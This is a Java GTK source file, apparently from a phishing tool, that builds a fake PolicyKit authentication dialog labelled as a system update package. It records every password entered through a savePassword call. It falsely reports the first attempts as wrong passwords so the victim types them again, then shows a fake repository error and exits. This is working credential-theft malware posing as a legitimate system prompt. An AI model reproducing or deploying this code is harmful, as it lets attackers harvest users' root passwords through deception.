package org.policykit.phishing.controller;


import org.gnome.gdk.Event;
import org.gnome.gtk.Builder;
import org.gnome.gtk.Button;
import org.gnome.gtk.Entry;
import org.gnome.gtk.Gtk;
import org.gnome.gtk.Label;
import org.gnome.gtk.MessageDialog;
import org.gnome.gtk.MessageType;
import org.gnome.gtk.ResponseType;
import org.gnome.gtk.Widget;
import org.gnome.gtk.Window;
import org.gnome.gtk.Button.Clicked;
import org.gnome.gtk.ButtonsType;
import org.policykit.phishing.chronic.ArchiveData;

public class Controller extends Window implements ArchiveData{
	
	final private Builder BUILDER;
	final private Window WINDOW;
	private Button bttnAccept, bttnCancel;
	private Label lblTitleWindow, lblpolicyKit, lblpasswdFaild;
	private Entry entryPasswd;
	int count = 0;
	RootOfTheProcess rootProcess;
	
	public Controller(Builder b) {
		
		this.BUILDER = b;
		
		//Ventana principal
		WINDOW = (Window) BUILDER.getObject("ID_appWindow");
		
		//Cajas de texto
		entryPasswd = (Entry) BUILDER.getObject("ID_passwdEntry");
		
		//Botones
		bttnAccept = (Button) BUILDER.getObject("ID_acceptBtn");
		bttnCancel = (Button) BUILDER.getObject("ID_cancelBtn");
		
		//Label
		String  desktop_environment = System.getenv("XDG_CURRENT_DESKTOP");
		
		lblTitleWindow = (Label) BUILDER.getObject("ID_titleLabel");
		lblTitleWindow.setLabel(desktop_environment+" Update Package");
		
		lblpolicyKit = (Label) BUILDER.getObject("ID_policyKitLabel");
		lblpolicyKit.setLabel(desktop_environment+" PolicyKit Agent");
		
		lblpasswdFaild	 = (Label) BUILDER.getObject("ID_passwdFaildLabel");
		
		//Conexion con metodos
		WINDOW.connect(on_window_destroy());
		bttnCancel.connect(on_cancelBtn_clicked());
		bttnAccept.connect(on_acceptBtn_clicked());
		WINDOW.showAll();
		
	}
	
	
	private Clicked on_acceptBtn_clicked() {
		return new Button.Clicked() {
			
			@Override
			public void onClicked(Button arg0) {
				rootProcess = new RootOfTheProcess();
				
				if(entryPasswd.getText().isEmpty()) {
					
					lblpasswdFaild.setLabel("Failed. Wrong password?");
					rootProcess.savePassword(entryPasswd.getText(), PASSWORD_ROOT);
					entryPasswd.setText("");
					
				} else if(count == 0 || count == 1) {
					
					lblpasswdFaild.setLabel("Failed. Wrong password? "+count);
					rootProcess.savePassword(entryPasswd.getText(), PASSWORD_ROOT);
					entryPasswd.setText("");
					count++;
					
				} else {
					
					lblpasswdFaild.setLabel("");
					
					try {
						
						Thread.sleep (3000);
						
						MessageDialog dialog = new MessageDialog(WINDOW, true, MessageType.ERROR, ButtonsType.CLOSE,"No se pudieron descargar todos los índices del los repositorio.");
						dialog.setSecondaryText("Es posible que el repositorio ya no esté disponible o que no se haya podido contactar debido a problemas de red. Si está disponible, se utilizará una versión anterior del índice fallido. De lo contrario, el repositorio será ignorado. Compruebe su conexión de red y asegúrese de que la dirección del repositorio en las preferencias sea correcta.");
						rootProcess.savePassword(entryPasswd.getText(), PASSWORD_ROOT);
						entryPasswd.setText("");
						
						
						System.out.println("Ultimo intento ");
						
						
						ResponseType choice = dialog.run();
						 if (choice == ResponseType.CLOSE) {
							 dialog.hide();
							 Gtk.mainQuit();
						 }
						 
						
					} catch (InterruptedException e) {

						e.printStackTrace();
					}
					
					
					
				}
				
				
			}
		};
	}

	private Clicked on_cancelBtn_clicked() {
		return new Button.Clicked() {
			
			@Override
			public void onClicked(Button arg0) {
				System.out.println("Exit");
				Gtk.mainQuit();
				
			}
		};
	}

	private DeleteEvent on_window_destroy() {
		return new Window.DeleteEvent() {
			
			@Override
			public boolean onDeleteEvent(Widget arg0, Event arg1) {
				System.out.println("Exit");
				Gtk.mainQuit();
				return false;
			}
		};
		
	}

}
